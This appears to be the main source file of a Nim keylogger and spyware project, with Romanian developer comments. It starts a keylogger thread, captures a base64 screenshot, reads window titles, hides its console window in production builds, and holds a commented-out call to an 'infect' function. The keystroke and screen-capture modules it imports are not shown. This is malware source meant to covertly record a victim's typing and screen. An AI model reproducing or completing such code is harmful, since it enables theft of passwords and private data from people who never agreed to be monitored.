import asyncdispatch
from os import sleep

import lib/threads/keyloggerThread
import lib/functions/getWindowName
import lib/functions/screenshot

from lib/channels import mainThread

# am pus asta doar ca sa testez func
# import lib/functions/infect
# infect()

# hide the console window
const isProd {.booldefine.}: bool = false

when isProd:
  from lib/functions/beforeStart import run
  run()

let base64Ss: string = screenshot()

# writeFile("base64.tmp.txt", base64Ss)

## TODO: CODE CLEANUP
## TODO: COMUNICARE INTRE THREADURI
var thr: Thread[void]

open mainThread

createThread(thr, initKeyloggerThread)

while true:
  ## TODO:
  ## NEVOIE DE OPTIMIZARI
  ## CONSUMA PREA MULT CPU
  ## CRED CA O SA TREBUIASCA SA IMPLEMENTEZ CV ASYNC
  ## sleep(10) se pare ca rezolva asta, dar n as vrea sa folosesc asta
  ## asa ca e probabil sa modifc aici oricand
  sleep(10)
  let channel = mainThread.tryRecv()

  if channel.dataAvailable:
    echo channel.msg

# proc main() {.async.} =
#   echo getWindowName()
#   await sleepAsync(1000)
#   asyncCheck main()

# asyncCheck main()

# runForever()

